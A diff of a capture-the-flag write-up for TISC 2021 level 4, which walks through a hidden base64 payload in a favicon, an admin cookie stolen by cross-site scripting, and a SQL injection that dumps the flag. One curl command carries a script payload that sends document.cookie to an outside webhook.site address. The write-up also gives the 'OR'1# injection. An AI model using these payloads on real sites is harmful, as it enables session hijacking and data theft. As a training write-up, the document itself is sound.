@@ -106,21 +106,21 @@ Flag : **TISC{n3VEr_0dd_0r_Ev3n}**
    1. https://www.riskiq.com/what-is-magecart/
    2. https://heimdalsecurity.com/blog/magecart-group-conceal-stolen-credit-card-details-into-image-files/
    3. https://thehackernews.com/2021/05/magecart-hackers-now-hide-php-based.html 
-* Checking out 1 : \
+* Checking out i : \
 ![ttp1](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_2_ttp1.JPG)
 * tried looking for javascripts that are running and see if there are any vulnerability. 
 * below is the only script that can be found, nothing vulnerable there. 
 ![ttp1_2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp1_1.JPG)
 * Tried all the web attacks on the payment page. Nothing much from there
 
-* Checking out 2 : \
+* Checking out ii : \
 ![ttp2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_2_ttp2.JPG)
 * checking out the images within the website 
 ![ttp2_2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp2_1.JPG)
 * nothing suspicious about the svg image. Hex output seems normal
 * nothing suspicious about the gif. All looks normal, even after using hex editor to skim through and strings, nothing suspicious
 
-* Checking out 3 : \
+* Checking out iii : \
 ![ttp3](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_2_ttp3.JPG)
 * checking the favicon of the website 
 ![ttp3_2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp3_1.JPG)
@@ -129,21 +129,29 @@ Flag : **TISC{n3VEr_0dd_0r_Ev3n}**
 * After Decoding with base64
 ![ttp3_4](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_3_ttp3_3.JPG)
 * Nice! Another webpage 
-![new_page1](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_1.JPG)
-![new_page2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_2.JPG)
-![new_page3](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_3.JPG)
-* Hmm what are those outputs?
+![new_page1](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_2.JPG)
+![new_page2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_1.JPG)
 * From the above base64 encoded command it seems to be doing a POST request with a certain field.
-* Hence I will also do similar Reference : https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/
-commands used
+![new_page3](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_4_3.JPG)
+* Hmm what are those html outputs?
+* Wow, it seems to generate certain html file which outputs what was typed into the request
+* robots.txt and found 2 interesting results
+![robots](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_1_robots_txt.JPG)
+* login.php leads to admin page, but it requires login credentials.
+* Looking above, we see that admin is the one viewing the post request sent.
+* Hence, it means that the admin is logged on. Which would mean that there is a potential for xss-cookie stealing.
+* With Reference from this [website](https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/)
+The commands used for XSS is as such
 ```
 curl -X POST "http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php" -d "14c4b06b824ec593239362517f538b29=<script>document.write('<img src="https://webhook.site/694ffb57-9ed8-4db2-86ae-5463fea3af0b?c='%2bdocument.cookie%2b'" />');</script>"
 ```
-* Wow, it seems to generate certain html file when clicked 
-
-* robots.x=txt and found 2 interesting result found
-* login.php leads to admin page
-* debug=TRUE leads to debug message as photo
+* BINGO! Cookie was stolen ! \
+![cookie_stolen](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_2.JPG)
+* Logging into the admin page leads to this : \
+![admin_landing](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_3.JPG)
+* There is a query box and it seems like it can be manipulated. (SQL Injection) 
+* debug=TRUE leads to debug message as photo \
+![debug_error](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_4_debug_out.JPG)
 * we can come up with the hypothesis that SQL query is 
 ```
 SELECT * FROM status WHERE filter=filter AND ID>0
@@ -154,6 +162,7 @@ SELECT * FROM status WHERE filter=filter AND ID>0
 * Thus we seem to be very close.
 * It now seem like we need to test for what are the useable characters and what are not.
 * using 'OR'1 and appending special characters to it we came to # and the flag is out.
+![Flag](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L4_5_5_flag.JPG)
 * Further investigation and we find out that # actually comments out ID>0 and hence the query will output what is on ID=0  
 
 
